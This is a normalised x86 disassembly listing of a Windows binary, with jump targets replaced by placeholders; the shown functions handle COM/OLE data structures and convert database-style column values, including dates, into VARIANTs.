push [ eax + 0x10 ]
push ecx
push [ eax + 0x8 ]
push [ ebp - 0x24 ]
call sub_40d35e
mov eax [ ebx + 0x10 ]
add [ ebp - 0x24 ] 0x34
mov ecx [ ebp + 0x8 ]
add esp 0x2c
add edi 0x4
inc [ ebp - 0x20 ]
mov [ eax + esi + 0x4 ] ecx
mov esi [ ebp - 0x20 ]
mov [ ebp + 0x8 ] edi
jmp r-xdata
sub_40d2b8
mov eax sub_42b1ec
call sub_410a78
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
and [ esi ] 0x0
mov [ esi + 0x4 ] eax
shl eax 0x3
push eax
call sub_4221b9
pop ecx
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_40d314
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov eax [ esi + 0x24 ]
push 0x0
push [ ebp + 0x10 ]
mov edx [ ecx ]
neg eax
push [ ebp + 0x14 ]
sbb eax eax
and eax 0x2
push esi
inc eax
push edi
inc eax
push eax
push ecx
call [ edx + 0x10 ]
test edi edi
mov ebx eax
jle r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
add esi 0x14
push [ esi ]
call sub_4221e2
add esi 0x34
dec edi
pop ecx
jne r-xdata
sub_40d35e
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push esi
push edi
xor ecx ecx
push 0x1
test dh 0x40
pop esi
je r-xdata
mov [ eax + 0x20 ] ecx
mov [ eax + 0x20 ] esi
jmp r-xdata
mov edx [ ebp + 0x2c ]
cmp edx ecx
je r-xdata
mov [ eax + 0x1c ] 0x3
mov [ eax + 0x8 ] edx
mov edi [ ebp + 0x30 ]
mov [ eax + 0x30 ] dx
mov dl [ ebp + 0x18 ]
mov [ eax + 0x14 ] edi
mov edi [ ebp + 0x20 ]
mov [ eax + 0x32 ] dl
mov dl [ ebp + 0x1c ]
mov [ eax + 0x24 ] edi
mov edi [ ebp + 0xc ]
mov [ eax + 0x33 ] dl
mov edx [ ebp + 0x24 ]
mov [ eax ] edi
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0x28 ]
mov [ eax + 0x1c ] esi
pop edi
cmp edx ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
pop esi
je r-xdata
pop ebp
retn
or [ eax + 0x1c ] 0x4
mov [ eax + 0xc ] edx
sub_40d3dd
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov eax [ ebx + 0x10 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebx + 0x10 ]
sub eax 0x0
je r-xdata
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push [ ebx + 0x14 ]
push eax
call sub_41244b
pop ecx
pop ecx
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x14 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop eax
push [ ebx + 0x14 ]
call sub_411325
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esp + 0x10 ]
test eax eax
mov [ ecx + 0x14 ] eax
je r-xdata
jmp r-xdata
sub_40d449
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
push edi
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
xor ecx ecx
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call [ eax + 0x8 ]
cmp [ esi + 0x48 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ esi + 0x14 ]
lea edi [ esi + 0x24 ]
jmp r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x90 ] 0x0
jmp r-xdata
mov eax [ esi + 0x14 ]
mov eax [ ebx + eax + 0x1c ]
test eax eax
je r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
mov ecx ebx
push eax
call sub_40d585
test al al
je r-xdata
inc ecx
add edi 0x28
cmp ecx [ ebp + 0xc ]
jl r-xdata
mov edx eax
mov ebx eax
mov eax [ eax ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp + 0x8 ]
je r-xdata
inc edi
add ebx 0x28
cmp edi [ esi + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push eax
mov ecx [ ecx + 0x9c ]
push ecx
call sub_41051e
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
lea eax [ ecx + ecx * 4 ]
push ebx
mov ecx [ esi + eax * 8 + 0x24 ]
call sub_41e2f2
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x14 ]
push [ ebp + 0x8 ]
lea eax [ edi + edi * 4 ]
mov ecx [ ecx + eax * 8 + 0x24 ]
call sub_41e2a5
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi [ esi + 0x10 ]
jl r-xdata
push eax
lea ecx [ ebp - 0x4 ]
call sub_422538
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov eax [ eax + 0x9c ]
push eax
call sub_41051e
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x4 ]
inc bl
call sub_422478
test bl bl
jne r-xdata
sub_40d585
cmp [ ecx + 0x18 ] 0x0
push esi
push edi
je r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ esp + 0xc ]
mov ecx [ ecx + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi ]
lea ecx [ ecx + edx - 0x1 ]
cmp eax ecx
ja r-xdata
mov esi [ ecx + 0xc ]
xor edi edi
test esi esi
jbe r-xdata
xor al al
jmp r-xdata
sub eax edx
mov [ esi ] eax
mov edx [ esp + 0xc ]
mov ecx [ ecx + 0x10 ]
add ecx 0x8
mov eax [ edx ]
pop edi
pop esi
retn 0x4
mov [ edx ] edi
jmp r-xdata
inc edi
add ecx 0x30
cmp edi esi
jb r-xdata
mov al 0x1
cmp [ ecx ] eax
je r-xdata
sub_40d5d8
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
push 0x0
add esi 0x18
push [ esp + 0xc ]
mov ecx esi
call sub_41e329
test eax eax
je r-xdata
push 0x0
push [ esp + 0xc ]
call [ eax + 0x4 ]
push [ esp + 0x8 ]
lea ecx [ esi + 0x18 ]
call sub_41e2a5
jmp r-xdata
pop esi
retn 0x8
push eax
mov ecx esi
call sub_41e2f2
sub_40d620
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x48 ] edi
je r-xdata
cmp [ esi + 0x40 ] edi
push ebx
je r-xdata
call sub_40d7ca
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
jle r-xdata
cmp [ esi + 0x38 ] edi
jle r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0x38 ]
cmp eax edi
jle r-xdata
mov eax [ esi + 0x14 ]
add eax 0x24
cmp [ esi + 0x38 ] 0x0
jle r-xdata
xor ebx ebx
xor edi edi
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] edi
jle r-xdata
lea eax [ eax + eax * 2 ]
shl eax 0x4
push eax
call sub_4221b9
pop ecx
mov [ esi + 0x3c ] eax
mov edx [ eax ]
add eax 0x28
mov edx [ edx + 0xc ]
add [ esi + 0x38 ] edx
dec ecx
jne r-xdata
xor edi edi
mov [ esi + 0x40 ] edi
push [ esi + 0x40 ]
call sub_4221e2
push [ esi + 0x3c ]
call sub_4221e2
pop ecx
pop ecx
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov ecx [ esi + 0x38 ]
mov eax [ esi + 0x8 ]
mov edi ecx
push 0x0
mov edx [ eax ]
shl edi 0x4
push edi
push [ esi + 0x3c ]
push ecx
push eax
call [ edx + 0x10 ]
mov eax [ esi + 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x8 ] edi
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
shl eax 0x4
push eax
call sub_4221b9
pop ecx
mov [ esi + 0x40 ] eax
inc [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x28
mov eax [ ebp - 0xc ]
cmp eax [ esi + 0x10 ]
jl r-xdata
lea edi [ edi + edi * 2 ]
shl edi 0x4
mov ecx esi
call sub_40d7ca
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop ebx
mov eax ebx
push 0x10
add eax [ esi + 0x40 ]
push 0x0
push eax
call sub_410a20
mov eax [ esi + 0x40 ]
add esp 0xc
and [ ebx + eax ] 0x0
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax + 0x24 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
mov ebx [ ebx ]
mov ecx esi
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
add eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x3c ]
add eax edi
push eax
call sub_40d3dd
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x3c ]
shl eax 0x4
mov [ ecx + edi + 0x18 ] eax
mov eax [ esi + 0x3c ]
mov ecx [ ebp - 0x10 ]
and [ eax + edi + 0x1c ] 0x0
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x24 ] 0xffffffff
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x20 ] 0xffffffff
mov eax [ esi + 0x3c ]
inc [ ebp - 0x4 ]
mov [ eax + edi + 0x28 ] 0x1
mov eax [ esi + 0x3c ]
mov ecx [ ecx + 0x98 ]
mov [ eax + edi + 0x2c ] ecx
add edi 0x30
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x4 ]
sub_40d7ca
push ebp
mov ebp esp
sub esp 0x18
xor edx edx
cmp [ ecx + 0x48 ] edx
je r-xdata
cmp [ ecx + 0x38 ] edx
jne r-xdata
mov ecx [ ecx + 0x50 ]
cmp ecx edx
je r-xdata
mov eax [ ecx + 0x40 ]
push ebx
mov ecx [ ecx + 0x8 ]
push esi
push edi
push 0x1
mov [ ebp - 0x10 ] eax
pop eax
lea ebx [ ebp - 0x18 ]
xor esi esi
push ebx
push edx
push esi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov edi [ ecx ]
push r--data
push eax
push ecx
call [ edi + 0x20 ]
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
leave
retn
cmp [ ecx + 0xc ] edx
je r-xdata
call sub_40cf9b
leave
retn
sub_40d827
mov eax sub_42b2ac
call sub_410a78
sub esp 0x134
and [ ebp - 0x3c ] 0x0
push ebx
push esi
lea eax [ ebp - 0x1c ]
push edi
mov esi ecx
push eax
call sub_40ff70
mov edi [ ebp + 0xc ]
mov ecx [ esi + 0x54 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
push edi
call sub_40dfa3
cmp [ ebp - 0x3c ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40fe18
lea eax [ ebp - 0x1c ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
mov ebx [ VariantClear@IAT ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ ecx + eax + 0x14 ]
mov ecx 0x81
movzx eax ax
cmp eax ecx
jg r-xdata
sub eax 0x82
je r-xdata
cmp eax ecx
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0xb
je r-xdata
je r-xdata
push eax
lea ecx [ ebp - 0x40 ]
call sub_422538
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x4 ] 0x4
call sub_40fe38
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_40ff56
lea eax [ ebp - 0x140 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40fe18
lea eax [ ebp - 0x1c ]
push eax
call ebx
push [ ebp + 0xc ]
mov ecx esi
call sub_40dfe7
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
fild [ ebp - 0x35 ]
mov al [ ebp - 0x37 ]
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
call sub_422478
push eax
lea ecx [ ebp - 0x44 ]
call sub_4224e6
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x120 ]
mov [ ebp - 0x4 ] 0x2
call sub_40fe38
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call sub_40ff56
lea eax [ ebp - 0x120 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
cmp eax 0xc
je r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x36 ] 0x0
jne r-xdata
fld st0
fmul [ r--data ]
fstp st1
jmp r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_40dfe7
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
fldz
fstp [ ebp - 0x34 ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movsx edx [ ebp - 0x24 ]
xor esi esi
push esi
push esi
push esi
push eax
push ecx
push edx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] esi
call sub_4100c0
fld [ ebp - 0x34 ]
mov [ ebp - 0x74 ] 0x7
fstp [ ebp - 0x6c ]
lea eax [ ebp - 0x74 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x74 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
jne r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
cmp eax 0xf
jle r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
fstp [ ebp - 0x7c ]
mov [ ebp - 0x84 ] 0x5
lea eax [ ebp - 0x84 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x84 ]
jmp r-xdata
fld st0
fchs
fstp st1
mov cl al
dec al
test cl cl
jbe r-xdata
push eax
call ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x24 ]
and [ ebp - 0x2c ] 0x0
lea eax [ eax + eax * 2 ]
shl eax 0x4
fldz
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
fstp [ ebp - 0x34 ]
mov esi eax
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movzx edx [ ebp - 0x24 ]
push eax
push ecx
push edx
push 0x1e
push 0xc
push 0x76b
lea ecx [ ebp - 0x34 ]
call sub_4100c0
fld [ ebp - 0x34 ]
mov [ ebp - 0xa4 ] 0x7
fstp [ ebp - 0x9c ]
lea eax [ ebp - 0xa4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xa4 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
mov ax [ eax ]
push 0xb
push eax
lea ecx [ ebp - 0x100 ]
call sub_40feb3
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xb
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x100 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x11
jle r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x38 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx eax [ ebp - 0x2e ]
movzx ecx [ ebp - 0x30 ]
movzx edx [ ebp - 0x32 ]
movzx esi [ ebp - 0x34 ]
movsx edi [ ebp - 0x38 ]
push eax
push ecx
movzx eax [ ebp - 0x36 ]
push edx
push esi
push eax
push edi
lea ecx [ ebp - 0xe0 ]
call sub_4100c0
fld [ ebp - 0xe0 ]
mov [ ebp - 0xd4 ] 0x7
fstp [ ebp - 0xcc ]
lea eax [ ebp - 0xd4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x130 ]
call sub_40fe18
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x130 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
cmp eax 0x12
je r-xdata
mov ax [ eax ]
push 0x2
push eax
lea ecx [ ebp - 0x110 ]
call sub_40feb3
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x7
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x110 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x13
jne r-xdata
push 0x3
lea ecx [ ebp - 0xf0 ]
push [ eax ]
call sub_40fee9
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xf0 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov al [ eax ]
mov [ ebp - 0xb4 ] 0x11
mov [ ebp - 0xac ] al
lea eax [ ebp - 0xb4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb4 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0x64 ] 0x4
fstp [ ebp - 0x5c ]
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
dec eax
jne r-xdata
fld [ eax ]
mov [ ebp - 0x94 ] 0x5
fstp [ ebp - 0x8c ]
lea eax [ ebp - 0x94 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xa
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x94 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ ecx + eax + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_40d585
test al al
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] 0x6
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x54 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0xc4 ] 0x7
fstp [ ebp - 0xbc ]
lea eax [ ebp - 0xc4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xc4 ]
jmp r-xdata
sub_40dfa3
lea eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call sub_40d585
test al al
je r-xdata
xor al al
mov eax [ esp + 0x8 ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
add eax ecx
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
mov edx ecx
and edx 0x3
add eax edx
add eax [ esi + 0x8 ]
mov eax [ eax + ecx + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
pop esi
retn 0x8
sub_40dffe
mov eax sub_42b2c8
call sub_410a78
sub esp 0x6c
push edi
mov edi ecx
xor ecx ecx
cmp [ edi + 0x10 ] ecx
mov [ edi + 0x44 ] 0x1
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
and [ edi + 0x44 ] 0x0
xor eax eax
pop edi
mov [ fs : 0x0 ] ecx
leave
retn
push ebx
mov ebx [ VariantClear@IAT ]
push esi
inc ecx
cmp ecx [ edi + 0x10 ]
mov [ ebp - 0x18 ] ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x4
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ edi + 0x14 ]
lea eax [ ecx + ecx * 4 ]
mov eax [ edx + eax * 8 + 0x24 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
mov ecx [ eax ]
mov esi [ eax + 0x8 ]
push 0x20
lea eax [ ebp - 0x78 ]
push 0x0
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] 0xfffffffd
call sub_410a20
add esp 0xc
lea eax [ ebp - 0x38 ]
push eax
call sub_40ff70
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x48 ] 0x0
je r-xdata
mov eax [ edi + 0x40 ]
add eax [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx edi
inc eax
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_40d827
push eax
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_40ff56
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x58 ]
push eax
call ebx
lea eax [ ebp - 0x38 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x38 ]
push eax
call ebx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x24 ]
push 0x1
mov [ ebp - 0x44 ] eax
pop eax
mov [ ebp - 0x40 ] eax
